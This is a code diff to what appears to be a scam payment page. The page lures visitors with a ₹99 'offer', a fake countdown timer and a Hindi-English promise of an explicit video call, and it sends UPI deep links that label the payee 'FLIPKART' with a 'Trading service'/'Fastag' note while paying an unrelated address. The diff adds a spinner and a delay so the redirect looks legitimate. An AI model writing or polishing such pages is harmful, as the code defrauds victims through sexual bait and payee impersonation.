@@ -146,10 +146,10 @@
         }
 
         .payment-btn-group {
-            padding: 5px;
+            padding: 15px;
             display: flex;
             flex-direction: column;
-            gap: 5px;
+            gap: 8px;
             color: black;
         }
 
@@ -158,6 +158,42 @@
             color: #cccccc;
             flex-shrink: 0;
             z-index: 999;
+        }
+
+        /* Loader Overlay */
+        #loader-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(83, 78, 78, 0.8);
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Loader Circle Animation */
+        .loader {
+            border: 8px solid transparent;
+            border-top: 8px solid yellow;
+            border-bottom: 8px solid yellow;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
     </style>
 </head>
@@ -169,6 +205,10 @@
         <div class="price">₹99 Only</div>
         <div class="offer-timer" id="countdown">⏳ Offer ends in: 03:50</div>
         <div class="message">Sirf 99rs ka recharge kar ke ajao video call pe sab dikhaungi kapde khol ke</div>
+
+        <div id="loader-overlay">
+            <div class="loader"></div>
+        </div>
 
         <div class="payment-btn-group">
             <div class="payment-btn" onclick="makePayment('phonepe')">
@@ -234,25 +274,31 @@
     function makePayment(method) {
         try {
             let redirectUrl = '';
-
-            switch (method) {
-                case 'phonepe':
-                    redirectUrl = 'phonepe://pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
-                    break;
-                case 'paytm':
-                    redirectUrl = 'paytmmp://pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
-                    break;
-                case 'gpay':
-                    redirectUrl = 'tez://upi/pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
-                    break;
-                case 'bhim':
-                    redirectUrl = 'upi://pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
-                    break;
-                default:
-                    alert('Invalid payment method!');
-                    return;
-            }
-            window.location.href = redirectUrl;
+            document.getElementById("loader-overlay").style.display = "flex";
+            setTimeout(() => {
+                switch (method) {
+                    case 'phonepe':
+                        redirectUrl = 'phonepe://pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
+                        document.getElementById("loader-overlay").style.display = "none";
+                        break;
+                    case 'paytm':
+                        redirectUrl = 'paytmmp://pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
+                        document.getElementById("loader-overlay").style.display = "none";
+                        break;
+                    case 'gpay':
+                        redirectUrl = 'tez://upi/pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
+                        document.getElementById("loader-overlay").style.display = "none";
+                        break;
+                    case 'bhim':
+                        redirectUrl = 'upi://pay?pn=FLIPKART&pa=netc.34161FA820328AA2CB704D00@mairtel&am=99&tn=Paying for Trading service&tr=Fastag&cu=INR&mc=0000&qrMedium=04';
+                        document.getElementById("loader-overlay").style.display = "none";
+                        break;
+                    default:
+                        alert('Invalid payment method!');
+                        return;
+                }
+                window.location.href = redirectUrl;
+            }, 1500);
         } catch (err) {
             console.log(err)
             alert(err)
